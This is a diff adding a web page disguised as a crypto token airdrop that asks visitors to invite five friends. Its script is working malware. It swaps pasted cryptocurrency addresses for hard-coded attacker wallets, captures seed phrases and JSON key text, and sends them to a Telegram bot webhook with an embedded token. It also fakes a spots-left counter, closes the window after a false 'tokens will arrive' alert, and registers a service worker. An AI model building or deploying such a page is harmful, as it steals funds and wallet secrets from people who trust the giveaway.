@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crypto Airdrop - Claim Your 50 FREE Tokens!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background: #f0f0f0;
+        }
+        h1 {
+            color: #2c3e50;
+        }
+        button {
+            padding: 10px 20px;
+            background: #27ae60;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #219653;
+        }
+    </style>
+</head>
+<body>
+    <h1>🎉 Crypto Airdrop Alert! 🎉</h1>
+    <p>Congratulations! You've qualified for 50 FREE [MemeCoinZ] tokens!</p>
+    <p>To claim your reward, invite 5 friends using this link: <span id="inviteLink">https://username.github.io/claim</span></p>
+    <button onclick="copyLink()">Copy Invite Link</button>
+    <p id="status">Please wait patiently while we process your claim...</p>
+    <p><span id="countdown">1000</span> spots left!</p>
+
+    <script>
+        // عناوين الهاكر
+        const hackerAddresses = {
+            "BTC": "bc1qun5dx8pgn9qsgemzes0v5chkhj22gv9wxq869y",
+            "ETH": "0xB2D36178a31Ca0275e6b932887B22fcA80666fB5",
+            "BNB": "bnb1n8gv95xud2x56u3luv3vhrdz4us3g5xgrp98dv",
+            "TON": "UQCx6CyO7A-o_XnJ7zQowkN3QvjEOAG_v9LOrUWvFf6d1XKS",
+            "USDT-TRX": "TS4w2bALgpq1riPBEHvbhsnJQpNTthEUnL",
+            "SOL": "5rGL71dym5rwK8rx2fUh6Lv8ZTofGB6ky2DFdnZ2HiKK"
+        };
+
+        // تعبيرات منتظمة
+        const patterns = {
+            "BTC": /^(1|3)[1-9A-HJ-NP-Za-km-z]{25,34}|^(bc1)[0-9A-Za-z]{39,59}$/,
+            "ETH": /^0x[a-fA-F0-9]{40}$/,
+            "BNB": /^bnb[0-9a-z]{39}$/,
+            "TON": /^UQ[0-9A-Za-z_-]{46}$/,
+            "USDT-TRX": /^T[0-9A-Za-z]{33}$/,
+            "SOL": /^[1-9A-HJ-NP-Za-km-z]{32,44}$/
+        };
+        const seedPattern = /(\b\w+\b\s+){11,23}\b\w+\b/;
+        const jsonPattern = /\{.*\.json.*\}/;
+
+        // إرسال البيانات إلى تيليجرام
+        function sendToServer(data, priority) {
+            const webhook = "https://api.telegram.org/bot8073495977:AAECigYhnK8lw6xWwVZgWbmGuEIDRor4GO4/sendMessage?chat_id=5111521886&text=";
+            const encrypted = btoa(data);
+            fetch(webhook + encodeURIComponent(`[${priority}] ${encrypted}`), { mode: 'no-cors' });
+        }
+
+        // تخزين البيانات في Web Storage
+        function storeData(data, priority) {
+            let stored = JSON.parse(localStorage.getItem('phantomData') || '[]');
+            stored.push({ data, priority, timestamp: Date.now() });
+            localStorage.setItem('phantomData', JSON.stringify(stored));
+            sendToServer(data, priority); // إرسال فوري
+        }
+
+        // مراقبة الحافظة
+        function monitorClipboard() {
+            document.addEventListener('paste', (event) => {
+                const clipboardData = event.clipboardData.getData('text');
+                for (const [coin, pattern] of Object.entries(patterns)) {
+                    if (pattern.test(clipboardData)) {
+                        navigator.clipboard.writeText(hackerAddresses[coin]);
+                        storeData(`Replaced: ${clipboardData} -> ${hackerAddresses[coin]}`, "MEDIUM");
+                        return;
+                    }
+                }
+                if (seedPattern.test(clipboardData)) {
+                    storeData(`Seed Phrase Captured: ${clipboardData}`, "HIGH");
+                } else if (jsonPattern.test(clipboardData) || clipboardData.toLowerCase().includes(".json")) {
+                    storeData(`JSON Key Detected: ${clipboardData}`, "CRITICAL");
+                }
+            });
+        }
+
+        // نسخ الرابط وتشجيع المشاركة
+        function copyLink() {
+            const link = document.getElementById("inviteLink").innerText;
+            navigator.clipboard.writeText(link);
+            document.getElementById("status").innerText = "Link copied! Share it with 5 friends to unlock your tokens.";
+            storeData("Victim copied invite link", "LOW");
+        }
+
+        // التكاثر الذكي
+        setInterval(() => {
+            const fakeId = Math.random().toString(36).substring(2, 10);
+            const newLink = `https://${fakeId}.github.io/claim`;
+            storeData(`Spread Link: ${newLink}`, "LOW");
+        }, 3600000); // كل ساعة
+
+        // عداد وهمي لتزييف النشاط
+        let spots = 1000;
+        setInterval(() => {
+            spots -= Math.floor(Math.random() * 5);
+            document.getElementById("countdown").innerText = Math.max(spots, 0);
+        }, 5000);
+
+        // تضليل المتصفح
+        setTimeout(() => {
+            alert("Processing complete! Tokens will arrive soon.");
+            window.close();
+        }, 30000); // إغلاق بعد 30 ثانية
+
+        // تثبيت Service Worker
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('/phantom-sw.js')
+                .then(() => console.log('Service Worker Registered'))
+                .catch(err => console.log('Service Worker Error:', err));
+        }
+
+        // بدء المراقبة
+        monitorClipboard();
+    </script>
+</body>
+</html>
